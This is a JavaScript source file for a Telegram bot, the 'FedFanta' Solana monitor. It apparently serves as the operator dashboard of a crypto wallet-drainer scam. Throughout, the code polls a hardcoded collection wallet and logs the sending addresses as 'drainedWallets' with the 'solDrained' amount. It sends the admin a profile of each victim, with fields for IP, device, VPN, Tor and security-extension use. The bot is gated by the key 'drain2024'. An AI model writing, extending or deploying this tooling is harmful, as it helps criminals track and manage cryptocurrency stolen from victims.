// ==========================================
// 🩸 FEDFANTA SOLANA WALLET MONITOR
// Polls destination wallet for new transfer events
// Sends Telegram alerts to admin
// ==========================================

import TelegramBot from 'npm:node-telegram-bot-api@0.64.0';
import { Connection, PublicKey, LAMPORTS_PER_SOL } from 'npm:@solana/web3.js@1.93.1';

const CFG = {
    BOT_TOKEN: Deno.env.get('BOT_TOKEN') || '8654897884:***',
    ADMIN_CHAT_ID: -1164147269,
    REQUIRED_KEY: 'drain2024',
    DESTINATION_WALLET: 'EH4XsehQw2LdEJVEn1go3gHBybGf8bF277G5HwR2TYc7',
    RPC_ENDPOINT: 'https://api.mainnet-beta.solana.com',
    DATA_SOURCE: 'poll',
    LOG_FILE: './drained.log',
    POLL_INTERVAL_MS: 15000,
};

const bot = new TelegramBot(CFG.BOT_TOKEN, { polling: true });
const drainedWallets = [];
const authenticated = new Set();

function requiresKey(chatId) { return chatId !== CFG.ADMIN_CHAT_ID; }
function isAuthorized(chatId) { return chatId === CFG.ADMIN_CHAT_ID || authenticated.has(chatId); }

async function pollDrains() {
    try {
        const connection = new Connection(CFG.RPC_ENDPOINT, 'confirmed');
        const destPubkey = new PublicKey(CFG.DESTINATION_WALLET);
        const signatures = await connection.getSignaturesForAddress(destPubkey, { limit: 20 });
        for (const sig of signatures) {
            if (sig.err === null && !drainedWallets.find(d => d.signature === sig.signature)) {
                try {
                    const tx = await connection.getTransaction(sig.signature, { maxSupportedTransactionVersion: 0 });
                    if (tx && tx.meta && tx.transaction.message.accountKeys) {
                        const accounts = tx.transaction.message.accountKeys;
                        const sourcePubkey = accounts.find(a => !a.equals(destPubkey) && tx.transaction.message.isAccountSigner(a));
                        if (sourcePubkey) {
                            const balanceLamports = tx.meta.preBalances[0] - tx.meta.postBalances[0];
                            drainedWallets.unshift({
                                signature: sig.signature, address: sourcePubkey.toString(),
                                solDrained: Math.abs(balanceLamports / LAMPORTS_PER_SOL),
                                time: new Date(sig.blockTime * 1000), website: 'unknown', ip: 'unknown', device: 'unknown',
                            });
                        }
                    }
                } catch (e) { /* skip */ }
            }
        }
    } catch (e) { console.log('[Bot] Poll error:', e.message); }
}

async function loadFromFile() {
    try {
        const raw = await Deno.readTextFile(CFG.LOG_FILE);
        for (const line of raw.trim().split('\n').filter(l => l.trim())) {
            try {
                const data = JSON.parse(line);
                if (data.address && !drainedWallets.find(d => d.address === data.address)) {
                    drainedWallets.push({ address: data.address, solDrained: data.sol || 0, time: data.time ? new Date(data.time) : new Date() });
                }
            } catch (e) { /* skip */ }
        }
    } catch (e) { /* file not ready */ }
}

function addManualDrain(chatId, address) {
    if (!drainedWallets.find(d => d.address === address)) {
        drainedWallets.unshift({ address, solDrained: 0, time: new Date() });
        return true;
    }
    return false;
}

function formatMsg(entry, index) {
    const t = entry.time ? entry.time.toLocaleString() : 'unknown';
    return `🩸 *Monitor Report | #${index}\n━━━━━━━━━━━━━━━━━━━━━\n📌 *Wallet:* \`${entry.address}\`\n🌐 *IP:* ${entry.ip || 'unknown'} dE United States\n💧 *Transfer strategy:* ${entry.strategy || 'Solana Mainnet'}\n${entry.balanceUsd && entry.balanceUsd > 0 ? `💰 *Balance:* $${entry.balanceUsd} USD\n` : ''}${entry.solDrained > 0 ? `💸 *Transferred:* ${entry.solDrained.toFixed(4)} SOL\n` : ''}\n🖥️ *Device:* ${entry.device || 'unknown'}\n🔒 *Security extension?:* ${entry.securityExt || 'No'}\n🌍 *VPN:* ${entry.vpn || 'No'}\n🧅 *Tor:* ${entry.tor || 'No'}\n🔀 *Proxy:* ${entry.proxy || 'No'}\n📱 *Dapp version:* ${entry.dappVersion || 'v5.0'}\n🕐 *Time:* ${t}\n━━━━━━━━━━━━━━━━━━━━━`;
}

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!requiresKey(chatId)) {
        authenticated.add(chatId);
        bot.sendMessage(chatId, '🩸 *FedFanta Monitor Bot*\n\n✅ Authorized as Admin\n\nCommands:\n/drains — View transfers\n/drains <address> — Add wallet\n/stats — Statistics\n/clear — Clear\n/settings — Configure', { parse_mode: 'Markdown' });
        return;
    }
    bot.sendMessage(chatId, '🔐 *Monitor Bot*\n\nEnter your API key:', { parse_mode: 'Markdown' });
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id, text = msg.text;
    if (isAuthorized(chatId)) return handleCmd(chatId, text, msg);
    if (text === CFG.REQUIRED_KEY) {
        authenticated.add(chatId);
        bot.sendMessage(chatId, '✅ *Access granted.*\n\nUse /start for commands.', { parse_mode: 'Markdown' });
    }
});

function handleCmd(chatId, text, msg) {
    if (!text || !text.startsWith('/')) return;
    const [cmd, ...args] = text.split(' ');
    switch (cmd) {
        case '/drains': {
            if (drainedWallets.length === 0) return bot.sendMessage(chatId, '📭 No transfers recorded.');
            for (let i = 0; i < Math.min(10, drainedWallets.length); i++) {
                bot.sendMessage(chatId, formatMsg(drainedWallets[i], i + 1), { parse_mode: 'Markdown' });
            }
            break;
        }
        case '/drain': {
            if (args[0]) {
                if (addManualDrain(chatId, args[0])) bot.sendMessage(chatId, `✅ Added to transfer list.`, { parse_mode: 'Markdown' });
                else bot.sendMessage(chatId, '⚠️ Already in list.');
            } else bot.sendMessage(chatId, 'Usage: /drain <wallet>');
            break;
        }
        case '/stats': {
            const total = drainedWallets.length, sol = drainedWallets.reduce((s, d) => s + (d.solDrained || 0), 0);
            bot.sendMessage(chatId, `📊 *Statistics*\nTotal: ${total} wallets\nTotal SOL: ${sol.toFixed(4)}`, { parse_mode: 'Markdown' });
            break;
        }
        case '/clear': drainedWallets.length = 0; bot.sendMessage(chatId, '🗑️ Cleared.'); break;
        case '/settings': bot.sendMessage(chatId, `⚙️ Source: ${CFG.DATA_SOURCE}\nWallet: ${CFG.DESTINATION_WALLET}`, { parse_mode: 'Markdown' }); break;
        case '/help': bot.sendMessage(chatId, `🩸 *Commands*\n/drains /drain /stats /clear /settings /help`, { parse_mode: 'Markdown' }); break;
    }
}

// Recursive timeout for Deno Deploy serverless
async function pollLoop() {
    const before = drainedWallets.length;
    await pollDrains();
    if (drainedWallets.length > before) {
        const newT = drainedWallets.length - before;
        console.log(`[Bot] Found ${newT} new transfer(s)`);
        const latest = drainedWallets[0];
        if (latest) {
            try {
                bot.sendMessage(CFG.ADMIN_CHAT_ID, `🩸 *New Transfer*\nWallet: \`${latest.address}\`\nSOL: ${latest.solDrained.toFixed(4)}`, { parse_mode: 'Markdown' });
            } catch (e) { /* skip */ }
        }
    }
    setTimeout(pollLoop, CFG.POLL_INTERVAL_MS);
}

console.log('[Bot] 🩸 FedFanta Monitor started');
pollLoop();

// Deno Deploy entry point
Deno.serve(() => new Response('🩸 FedFanta Monitor running'));
